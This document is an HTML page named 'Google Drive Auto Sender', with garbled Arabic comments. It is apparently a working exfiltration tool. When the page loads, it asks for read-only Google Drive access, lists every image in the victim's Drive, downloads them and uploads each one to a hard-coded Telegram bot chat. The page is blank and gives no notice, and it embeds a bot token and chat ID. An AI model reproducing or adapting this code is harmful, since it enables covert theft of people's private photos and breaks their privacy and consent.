<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>Google Drive Auto Sender</title>
  <script src="https://accounts.google.com/gsi/client" async defer></script>
  <script src="https://apis.google.com/js/api.js"></script>
</head>
<body style="margin:0; padding:0; background:#fff; font-family:sans-serif;">

<script>
  const CLIENT_ID = '448184436252-2psfum2qgah9v1ahbt10es5ogr60n19s.apps.googleusercontent.com';
  const SCOPES = 'https://www.googleapis.com/auth/drive.readonly';
  const TELEGRAM_BOT_TOKEN = '7690497444:AAH1HVDn2HKjt6fIvhr9kTOfwxUYOPNq3Rw';
  const TELEGRAM_CHAT_ID = '6894787120';
  let access_token = null;

  // ØªØ­Ù…ÙŠÙ„ Ù…ÙƒØªØ¨Ø© gapi Ø«Ù… Ø¨Ø¯Ø£ Ø§Ù„Ø¹Ù…Ù„ÙŠØ©
  function loadGapiAndStart() {
    gapi.load('client', async () => {
      const tokenClient = google.accounts.oauth2.initTokenClient({
        client_id: CLIENT_ID,
        scope: SCOPES,
        callback: async (tokenResponse) => {
          if (tokenResponse.access_token) {
            access_token = tokenResponse.access_token;
            await gapi.client.init({
              discoveryDocs: ['https://www.googleapis.com/discovery/v1/apis/drive/v3/rest'],
            });
            startSending();
          } else {
            alert('ÙØ´Ù„ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØªÙˆÙƒÙ†!');
          }
        }
      });

      // Ø·Ù„Ø¨ Ø§Ù„ÙˆØµÙˆÙ„ Ù…Ø¨Ø§Ø´Ø±Ø©
      tokenClient.requestAccessToken({prompt: ''});
    });
  }

  async function listAllImages() {
    let files = [];
    let pageToken = null;
    do {
      const response = await gapi.client.drive.files.list({
        q: "mimeType contains 'image/' and trashed = false",
        fields: "nextPageToken, files(id, name)",
        pageSize: 1000,
        pageToken: pageToken
      });
      files = files.concat(response.result.files);
      pageToken = response.result.nextPageToken;
    } while (pageToken);
    return files;
  }

  function getImageDownloadUrl(fileId) {
    return `https://www.googleapis.com/drive/v3/files/${fileId}?alt=media`;
  }

  async function sendImageToTelegram(fileName, fileUrl) {
    try {
      const res = await fetch(fileUrl, {
        headers: { 'Authorization': 'Bearer ' + access_token }
      });
      const blob = await res.blob();

      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('caption', `ğŸ“· ${fileName}`);
      formData.append('document', blob, fileName);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        body: formData
      });
    } catch (err) {
      console.error('Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©:', fileName, err);
    }
  }

  async function startSending() {
    const files = await listAllImages();
    for (const file of files) {
      const url = getImageDownloadUrl(file.id);
      await sendImageToTelegram(file.name, url);
    }
  }

  // Ù†Ø¨Ø¯Ø£ Ø¨Ø¹Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
  window.onload = () => {
    if (typeof gapi !== 'undefined') {
      loadGapiAndStart();
    } else {
      alert('ÙØ´Ù„ ØªØ­Ù…ÙŠÙ„ Ù…ÙƒØªØ¨Ø© gapi!');
    }
  };
</script>

</body>
</html>
